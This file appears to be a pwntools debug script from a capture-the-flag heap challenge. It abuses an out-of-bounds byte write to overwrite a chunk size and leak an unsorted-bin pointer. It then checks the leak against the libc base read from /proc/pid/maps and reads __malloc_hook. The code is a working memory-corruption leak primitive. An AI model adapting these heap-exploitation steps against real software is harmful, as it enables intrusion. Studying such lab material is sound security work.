#!/usr/bin/env python3
"""Quick debug: compare leaked unsorted bin fd with known libc base."""
from pwn import *
import struct
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')
LD_PATH = str((CHALLENGE_DIR / 'glibc' / 'ld-linux-x86-64.so.2').resolve())

env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}
r = process([LD_PATH, BINARY], env=env, cwd=str(CHALLENGE_DIR))
r.recvuntil(b'name?')
r.sendline(b'pwn')

pid = r.pid
maps = open(f'/proc/{pid}/maps').read()
libc_base = None
for l in maps.split('\n'):
    p = l.strip().split()
    if len(p) < 5: continue
    if 'libc.so.6' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        libc_base = int(p[0].split('-')[0], 16)
        break

libc = ELF(str(CHALLENGE_DIR / 'glibc' / 'libc.so.6'), checksec=False)

# Do the unsorted bin leak
def menu(io, choice):
    io.recvuntil(b'> ')
    io.sendline(str(choice).encode())

def create_and_save(io, size, data=None):
    menu(io, 2)
    io.recvuntil(b':\n')
    io.sendline(str(size).encode())
    io.recvuntil(b':\n')
    d = data if data is not None else b'A' * size
    io.sendline(d[:size])
    io.recvuntil(b'text?\n')
    io.sendline(b'n')
    io.recvuntil(b'memory?\n')
    io.sendline(b'y')
    io.recvuntil(b'location ')
    return int(io.recvline().strip())

def delete(io, slot):
    menu(io, 4)
    io.recvuntil(b':\n')
    io.sendline(str(slot).encode())

def cont_proc(io, slot):
    menu(io, 5)
    io.recvuntil(b':\n')
    io.sendline(str(slot).encode())
    io.recvuntil(b'> ')

def ow(io, offset, value):
    io.sendline(b'3')
    io.recvuntil(b':\n')
    io.sendline(str(offset).encode())
    io.recvuntil(b'?\n')
    io.send(bytes([value & 0xff]) + b'\n')
    io.recvuntil(b'> ')

def wb(io, offset, data):
    for i, b in enumerate(data):
        ow(io, offset + i, b)

def examine(io):
    io.sendline(b'2')
    io.recvuntil(b'Your message:\n')
    data = io.recvuntil(b'+---------------------------+', drop=True)
    io.recvuntil(b'> ')
    return data.rstrip(b'\n')

s1 = create_and_save(r, 0x100)
s2 = create_and_save(r, 0x500)
create_and_save(r, 0x20)
delete(r, s2)
cont_proc(r, s1)

ow(r, -8, 0x21)
ow(r, -7, 0x06)
for i in range(0x100, 0x110):
    ow(r, i, 0x41)
for i in range(0x118, 0x120):
    ow(r, i, 0x41)

data = examine(r)
libc_leak = u64(data[0x110:0x116].ljust(8, b'\x00'))

log.info(f"libc_base (from /proc/pid/maps) = {hex(libc_base)}")
log.info(f"libc_leak (unsorted fd)          = {hex(libc_leak)}")
log.info(f"diff = libc_leak - libc_base     = {hex(libc_leak - libc_base)}")
log.info(f"main_arena+0x60 would be         = {hex(libc_base + 0x1e4ca0)}" if libc_base else "unknown")

# Also check what __malloc_hook says by reading it
if libc_base:
    with open(f'/proc/{pid}/mem', 'rb') as f:
        f.seek(libc_base + 0x1ee1e0)
        mhook = struct.unpack('<Q', f.read(8))[0]
        log.info(f"__malloc_hook value = {hex(mhook)}")

r.close()
